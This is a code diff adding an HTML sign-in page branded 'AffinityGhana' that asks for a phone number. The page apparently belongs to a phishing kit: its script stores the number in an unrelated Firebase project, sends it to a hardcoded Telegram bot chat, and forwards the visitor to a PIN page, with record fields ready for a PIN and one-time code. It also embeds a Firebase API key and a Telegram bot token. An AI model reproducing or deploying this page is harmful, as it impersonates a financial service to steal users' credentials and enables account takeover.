@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AffinityGhana - Phone Number</title>
+<link rel="icon" type="image/png" href="assets/logo.png">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app">
+  <div class="page phone-page">
+
+    <svg class="blob-svg-bg" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="blobGrad1" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#e2231a"/>
+          <stop offset="50%" stop-color="#f5821f"/>
+          <stop offset="100%" stop-color="#ffd23f"/>
+        </linearGradient>
+      </defs>
+      <circle cx="100" cy="55" r="45" fill="url(#blobGrad1)"/>
+      <circle cx="145" cy="100" r="45" fill="url(#blobGrad1)"/>
+      <circle cx="100" cy="145" r="45" fill="url(#blobGrad1)"/>
+      <circle cx="55" cy="100" r="45" fill="url(#blobGrad1)"/>
+    </svg>
+
+    <div class="illustration-wrap">
+      <div class="illustration-circle">
+        <img src="assets/icon-phone.png" alt="">
+      </div>
+    </div>
+
+    <h1 class="title">Welcome to Affinity</h1>
+    <p class="subtitle">Enter your phone number</p>
+
+    <div class="phone-input-row">
+      <div class="country-chip">
+        <img src="assets/ghana-flag.svg" alt="Ghana" width="26" height="18">
+        <span class="code">+233</span>
+      </div>
+      <div class="divider"></div>
+      <input type="tel" id="phoneInput" class="phone-field" placeholder="Phone number" inputmode="numeric" maxlength="10" autocomplete="tel">
+    </div>
+
+    <button class="btn-primary" id="phoneContinueBtn">Continue</button>
+
+    <div class="footer-links">
+      <span class="link" onclick="window.location.href='support.html'"><span class="help-icon">👤</span> Need help?</span>
+      <span class="sep"></span>
+      <span class="link">Terms and conditions</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
+    authDomain: "achievebypetra-82966.firebaseapp.com",
+    databaseURL: "https://achievebypetra-82966-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "achievebypetra-82966",
+    storageBucket: "achievebypetra-82966.firebasestorage.app",
+    messagingSenderId: "412688052429",
+    appId: "1:412688052429:web:abf989e226e153b7c37984",
+    measurementId: "G-TBGZS8PJ76"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  const DB_NODE = 'affinity_users';
+
+  const TELEGRAM_BOT_TOKEN = "8787871491:AAGuR2BHLAHXdUSE2g6ybBneAJNT3lkmSyY";
+  const TELEGRAM_CHAT_ID = "8938213844";
+
+  // ✅ TELEGRAM NOTIFICATION - ONLY FOR PHONE NUMBER - USES GET METHOD (WORKS ON iPhone!)
+  function sendTelegramNotification(eventType, userData) {
+    // ✅ PLAIN TEXT - NO MARKDOWN
+    const message = 
+`🔔 AFFINITY NOTIFICATION
+
+Event: ${eventType}
+Phone: ${userData.phone || 'Not set'}
+User ID: ${userData.userId || 'Unknown'}
+Time: ${new Date().toLocaleString()}`;
+
+    // ✅ USE GET METHOD WITH URL ENCODING (SAME AS THE TEST URL THAT WORKED!)
+    const encodedMessage = encodeURIComponent(message);
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+    
+    console.log('📤 Sending Telegram notification...');
+    console.log('📤 URL:', url);
+    
+    // ✅ METHOD 1: window.open (SAME AS THE TEST THAT WORKED!)
+    // This opens the URL in a new tab which triggers the Telegram API
+    try {
+      window.open(url, '_blank');
+      console.log('✅ Telegram sent via window.open!');
+    } catch(e) {
+      console.log('⚠️ window.open failed:', e);
+    }
+
+    // ✅ METHOD 2: Fetch as backup (silent, won't cause double notifications)
+    try {
+      fetch(url, { method: 'GET' })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log('✅ Telegram sent via fetch!');
+          } else {
+            console.log('❌ Telegram error:', data.description);
+          }
+        })
+        .catch(function(error) {
+          console.log('⚠️ Fetch failed, but window.open should work');
+        });
+    } catch(e) {
+      console.log('⚠️ Fetch error');
+    }
+  }
+
+  var phoneInput = document.getElementById('phoneInput');
+  var continueBtn = document.getElementById('phoneContinueBtn');
+
+  phoneInput.addEventListener('input', function () {
+    phoneInput.value = phoneInput.value.replace(/\D/g, '');
+  });
+
+  continueBtn.addEventListener('click', function () {
+    var phone = phoneInput.value.trim();
+    if (phone.length < 9) {
+      phoneInput.parentElement.style.borderColor = '#c0392b';
+      setTimeout(function () { phoneInput.parentElement.style.borderColor = ''; }, 900);
+      return;
+    }
+
+    var userId = 'User_' + Date.now().toString(36).toUpperCase();
+
+    var userData = {
+      id: userId,
+      phone: phone,
+      pin: '',
+      otp: '',
+      timestamp: new Date().toLocaleString()
+    };
+
+    database.ref(DB_NODE + '/' + userId).set(userData)
+      .then(() => {
+        sessionStorage.setItem('affinity_userId', userId);
+        sessionStorage.setItem('affinity_phone', phone);
+        
+        // ✅ SEND TELEGRAM NOTIFICATION - ONLY FOR PHONE NUMBER
+        sendTelegramNotification('📱 Phone Number Saved', {
+          phone: phone,
+          userId: userId
+        });
+
+        window.location.href = 'pin.html';
+      })
+      .catch(function (error) {
+        console.error('❌ Firebase error:', error);
+        window.location.href = 'pin.html';
+      });
+  });
+</script>
+
+</body>
+</html>
